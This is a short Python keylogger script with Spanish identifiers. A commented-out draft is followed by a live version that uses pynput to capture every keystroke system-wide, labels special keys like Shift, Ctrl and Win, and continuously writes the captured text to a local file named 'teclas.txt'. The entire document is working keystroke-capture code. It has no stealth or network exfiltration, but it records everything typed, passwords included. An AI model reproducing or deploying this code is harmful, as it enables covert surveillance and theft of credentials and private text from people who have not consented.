# import pynput


# teclas = []

# def presionarT(t):
#     if t == pynput.keyboard.Key.space:
#         tecla = " "
#     elif t == pynput.keyboard.Key.enter:
#         tecla = "\n"
#     elif t == pynput.keyboard.Key.backspace:
#         if teclas:
#             teclas.pop()
#         actualizarArchivo()
#         return
#     else:
#         tecla = str(t)

   
#     teclas.append(tecla)
#     print("Teclas: ", teclas)
#     actualizarArchivo()

# def actualizarArchivo():
#     with open("teclas.txt", "w") as Keyl:
#         for t in teclas:
#             Keyl.write(t.replace("'", ""))
    

# with pynput.keyboard.Listener(on_press=presionarT) as li:
#     li.join()




import pynput

teclas = []

def presionarT(tecla):
    if hasattr(tecla, 'char'):
        tecla = tecla.char
    elif tecla == pynput.keyboard.Key.space:
        tecla = " "
    elif tecla == pynput.keyboard.Key.enter:
        tecla = "\n"
    elif tecla in (pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r):
        tecla = " <Shift> "
    elif tecla in (pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r):
        tecla = " <Alt> "
    elif tecla == pynput.keyboard.Key.tab:
        tecla = " <Tab> "
    elif tecla == pynput.keyboard.Key.esc:
        tecla = " <Esc> "
    elif tecla == pynput.keyboard.Key.ctrl_l    : 
        tecla = " <Ctr L> "
    elif tecla == pynput.keyboard.Key.ctrl_r    : 
        tecla = " <Ctr R> " 
    elif tecla == pynput.keyboard.Key.alt_gr: 
        tecla = " <Alt gr> " 
    elif tecla == pynput.keyboard.Key.alt_l: 
        tecla = " <Alt> " 
    elif tecla == pynput.keyboard.Key.cmd: 
        tecla = " <Win> " 
    elif tecla == pynput.keyboard.Key.backspace:
        if teclas:
            teclas.pop()  # Eliminar el último carácter
        actualizarArchivo()
        return
    else:
        tecla = str(tecla)

 
    teclas.append(tecla)
    print("Teclas: ", teclas)
    actualizarArchivo()

def actualizarArchivo():
    with open("teclas.txt", "w") as archivo:
        archivo.write(''.join(teclas))

with pynput.keyboard.Listener(on_press=presionarT) as escuchador:
    escuchador.join()
